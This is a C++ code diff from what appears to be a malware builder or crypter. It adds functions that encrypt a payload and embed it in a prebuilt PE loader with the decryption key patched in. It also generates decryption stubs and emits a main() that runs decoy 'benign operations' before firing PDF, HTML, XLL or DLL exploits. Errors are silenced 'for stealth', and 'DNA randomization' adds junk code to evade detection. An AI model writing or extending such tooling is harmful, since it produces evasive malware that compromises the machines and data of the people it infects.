@@ -31,7 +31,11 @@
 #include <iomanip>
 #include <ctime>
 #include <cstring>
+#include <cstdint>
+#include <cstdlib>
 #include "tiny_loader.h"
+#include "cross_platform_encryption.h"
+#include "enhanced_tiny_loader.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -1466,7 +1470,7 @@ exit /b 1
         return result;
     }
     
-private:
+public:
     std::vector<uint8_t> generateMinimalPEExecutable(const std::string& payload) {
         // REAL INTERNAL COMPILER - NO EXTERNAL TOOLS NEEDED!
         // Uses pre-built minimal PE loader, patches it with payload
@@ -1503,6 +1507,82 @@ private:
             // Fallback to external compiler if anything goes wrong
             return {};
         }
+    }
+
+    // ENHANCED: Generate encrypted PE executable with cross-platform encryption
+    std::vector<uint8_t> generateEncryptedPEExecutable(const std::string& payload, 
+                                                     CrossPlatformEncryption::Method encryptionMethod = CrossPlatformEncryption::Method::XOR) {
+        try {
+            // Initialize encryption engine
+            CrossPlatformEncryption crypto;
+            
+            // Convert payload to bytes
+            std::vector<uint8_t> payloadBytes(payload.begin(), payload.end());
+            
+            // Encrypt the payload
+            std::vector<uint8_t> encryptedPayload = crypto.encrypt(payloadBytes, encryptionMethod);
+            
+            // Use enhanced loader that supports decryption
+            std::vector<uint8_t> exe(enhanced_tiny_loader_bin, enhanced_tiny_loader_bin + enhanced_tiny_loader_bin_len);
+            
+            // Pad to PE alignment
+            constexpr size_t kAlign = 0x200;
+            size_t paddedSize = (exe.size() + kAlign - 1) & ~(kAlign - 1);
+            exe.resize(paddedSize, 0);
+            
+            // Append encrypted payload
+            size_t payloadOffset = exe.size();
+            exe.insert(exe.end(), encryptedPayload.begin(), encryptedPayload.end());
+            
+            // Create encryption metadata
+            EncryptionMetadata metadata;
+            metadata.method = static_cast<uint32_t>(encryptionMethod);
+            metadata.keySize = 32;
+            metadata.ivSize = 16;
+            metadata.payloadSize = static_cast<uint32_t>(encryptedPayload.size());
+            
+            // Get the key and IV from the crypto engine
+            std::string keyHex = crypto.getKeyAsHex();
+            std::string ivHex = crypto.getIVAsHex();
+            
+            // Parse hex strings back to bytes (simplified)
+            auto hexToByte = [](const std::string& hex, size_t start) -> uint8_t {
+                std::string byteStr = hex.substr(start, 4); // "0xXX"
+                return static_cast<uint8_t>(std::stoul(byteStr, nullptr, 16));
+            };
+            
+            // Extract key bytes
+            for (int i = 0; i < 32; ++i) {
+                size_t pos = i * 6; // Each byte is "0xXX, " = 6 chars
+                if (pos < keyHex.size()) {
+                    metadata.key[i] = hexToByte(keyHex, pos);
+                }
+            }
+            
+            // Extract IV bytes
+            for (int i = 0; i < 16; ++i) {
+                size_t pos = i * 6;
+                if (pos < ivHex.size()) {
+                    metadata.iv[i] = hexToByte(ivHex, pos);
+                }
+            }
+            
+            // Patch the enhanced loader with encryption parameters
+            EnhancedLoaderUtils::patchLoaderWithEncryption(exe, metadata, payloadOffset);
+            
+            return exe;
+            
+        } catch (...) {
+            // Fallback to regular non-encrypted version
+            return generateMinimalPEExecutable(payload);
+        }
+    }
+
+    // Generate decryption stub source code for compilation method
+    std::string generateDecryptionStubSource(const std::vector<uint8_t>& encryptedPayload, 
+                                           CrossPlatformEncryption::Method encryptionMethod) {
+        CrossPlatformEncryption crypto;
+        return crypto.generateDecryptionStub(encryptionMethod, encryptedPayload);
     }
 
 };
@@ -1925,17 +2005,56 @@ public:
             std::string combinedCode = exploitIncludes + "\n";
             combinedCode += benignCode + "\n\n";
             
-            // Note: Main function will be added later in the process
-            // Do not add main function here to avoid duplicates
+            // Add exploit code if present
+            if (!exploitCode.empty()) {
+                combinedCode += exploitCode + "\n\n";
+            }
             
-            debugLog << "Combined Code Length: " << combinedCode.length() << "\n";
+            // Generate proper main() entry point that calls benign operations and exploits
+            combinedCode += "int main() {\n";
+            combinedCode += "    try {\n";
+            combinedCode += "        // Call benign operations first\n";
+            combinedCode += "        performBenignOperations();\n\n";
             
-            // Apply DNA randomization (this adds junk variables safely)
+            // Add exploit execution based on type
+            if (exploitType != EXPLOIT_NONE) {
+                switch (exploitType) {
+                    case EXPLOIT_PDF:
+                        combinedCode += "        // Execute PDF exploit\n";
+                        combinedCode += "        executePDFExploit();\n";
+                        break;
+                    case EXPLOIT_HTML:
+                        combinedCode += "        // Execute HTML exploit\n";
+                        combinedCode += "        executeHTMLExploit();\n";
+                        break;
+                    case EXPLOIT_XLL:
+                        combinedCode += "        // Execute XLL exploit\n";
+                        combinedCode += "        executeXLLExploit();\n";
+                        break;
+                    case EXPLOIT_DLL:
+                        combinedCode += "        // Execute DLL exploit\n";
+                        combinedCode += "        executeDLLExploit();\n";
+                        break;
+                    default:
+                        combinedCode += "        // No specific exploit selected\n";
+                        break;
+                }
+            }
+            
+            combinedCode += "    } catch (...) {\n";
+            combinedCode += "        // Silent error handling for stealth\n";
+            combinedCode += "    }\n";
+            combinedCode += "    return 0;\n";
+            combinedCode += "}\n\n";
+            
+            debugLog << "Combined Code Length (with main): " << combinedCode.length() << "\n";
+            
+            // Apply DNA randomization after adding main (this adds junk variables safely)
             try {
                 combinedCode = dnaRandomizer.randomizeCode(combinedCode);
-                debugLog << "DNA randomization: SUCCESS\n";
+                debugLog << "DNA randomization: SUCCESS (post-main)\n";
             } catch (...) {
-                debugLog << "DNA randomization: FAILED\n";
+                debugLog << "DNA randomization: FAILED (post-main)\n";
             }
             
             // Create temporary source file
